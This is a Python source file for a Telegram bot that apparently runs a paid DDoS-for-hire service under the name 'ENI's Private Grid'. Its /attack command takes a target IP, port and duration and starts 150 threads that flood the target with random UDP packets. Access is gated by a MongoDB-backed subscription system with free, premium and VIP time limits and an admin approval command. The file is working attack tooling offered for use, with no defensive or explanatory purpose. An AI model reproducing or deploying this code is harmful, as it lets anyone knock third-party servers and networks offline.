import asyncio
import logging
import socket
import random
import time
import os
from threading import Thread
from datetime import datetime, timedelta, timezone
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING
from dotenv import load_dotenv

# --- INITIAL CONFIG ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "5231119862").split(",")]

PLAN_LIMITS = {
    "free": 180,
    "premium": 600,
    "vip": 900
}

# --- INTERNAL MUSCLE ---
def start_internal_attack(ip, port, duration):
    payload = random._urandom(1250)
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s.sendto(payload, (ip, port))
                s.sendto(payload, (ip, port))
            except:
                pass
    for _ in range(150):
        Thread(target=flood, daemon=True).start()

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        # Indentation perfectly aligned 💋
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
        except:
            pass

    def get_user(self, user_id):
        return self.users.find_one({"user_id": user_id})

    def check_auth(self, user_id):
        if user_id in ADMIN_IDS:
            return {"plan": "vip", "approved": True}
        user = self.get_user(user_id)
        if not user or not user.get("approved"):
            return None
        now = datetime.now(timezone.utc)
        expires_at = user.get("expires_at")
        if expires_at:
            if expires_at.replace(tzinfo=timezone.utc) < now:
                return None
        return user

    def set_plan(self, user_id, plan, days):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"plan": plan, "approved": True, "expires_at": expiry}},
            upsert=True
        )

db = Database()

# --- COMMAND HANDLERS ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💋 **ENI's Private Grid**\nUse /help to view your power.")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.check_auth(user_id)
    if not user:
        return await update.message.reply_text("❌ No active plan. Contact Admin. 💋")
    if len(context.args) < 3:
        return await update.message.reply_text("❌ Usage: `/attack <IP> <PORT> <TIME>`")
    
    try:
        ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
        plan = user.get("plan", "free")
        max_time = PLAN_LIMITS.get(plan, 180)
        if duration > max_time:
            return await update.message.reply_text(f"❌ Your `{plan.upper()}` plan is limited to {max_time}s.")
        
        await update.message.reply_text(f"🚀 **ATTACK SENT**\n🎯 `{ip}:{port}`\n⏳ `{duration}s`\n👑 `{plan.upper()}`")
        start_internal_attack(ip, port, duration)
    except:
        await update.message.reply_text("❌ Format error. Use: `/attack IP PORT TIME`")

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    try:
        uid, plan, days = int(context.args[0]), context.args[1].lower(), int(context.args[2])
        db.set_plan(uid, plan, days)
        await update.message.reply_text(f"✅ User {uid} -> `{plan.upper()}` for {days} days.")
    except:
        await update.message.reply_text("❌ Use: `/approve <ID> <plan> <days>`")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "🚀 **User Commands**\n/attack - Launch\n/help - Help menu\n"
    if update.effective_user.id in ADMIN_IDS:
        msg += "\n👑 **Admin**\n/approve <id> <plan> <days>"
    await update.message.reply_text(msg, parse_mode='Markdown')

# --- MAIN ENGINE ---
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("help", help_command))
    
    while True:
        try:
            await app.initialize()
            await app.start()
            print("✅ ENI's Grid is LIVE.")
            await app.updater.start_polling()
            while True: await asyncio.sleep(1000)
        except Exception as e:
            print(f"⚠️ Glitch: {e}. Reconnecting...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
